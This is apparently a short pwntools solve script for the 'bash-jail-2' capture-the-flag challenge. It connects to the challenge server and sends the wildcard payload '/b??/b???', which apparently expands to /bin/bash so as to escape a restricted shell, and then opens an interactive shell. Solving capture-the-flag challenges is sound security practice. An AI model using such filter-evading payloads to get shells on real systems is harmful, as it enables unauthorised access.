# bash-jail-2 — Pwny-CTF (script de solve)
from pwn import *

HOST, PORT = "chal.sigpwny.com", 5006
context.log_level = "debug"

io = remote(HOST, PORT)

io.recv()

payload = b"/b??/b???"
io.sendline(payload)

io.interactive()

io.recv()
